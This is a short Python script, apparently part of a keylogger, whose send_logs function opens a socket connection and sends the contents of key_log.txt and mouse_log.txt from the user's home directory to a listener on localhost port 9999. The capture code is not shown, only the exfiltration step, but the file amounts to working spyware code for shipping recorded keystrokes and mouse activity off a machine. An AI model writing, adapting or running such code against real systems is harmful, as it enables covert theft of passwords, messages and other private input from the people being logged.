import socket
import os

log_dir=os.path.expanduser("~/")

files = [log_dir + 'key_log.txt', log_dir + 'mouse_log.txt']
def send_logs():
    s=None
    try:
        s = socket.socket()
        s.connect(("localhost",9999))
        for filename in files:              
                try:
                    with open(filename, "rb") as f:
                        s.sendall(f.read())
                except FileNotFoundError:
                    print(f"Skipping missing log file: {filename}")
    except OSError as e:
        print(f"Could not reach server: {e}")
        return
    finally:
        if s:
            s.close()
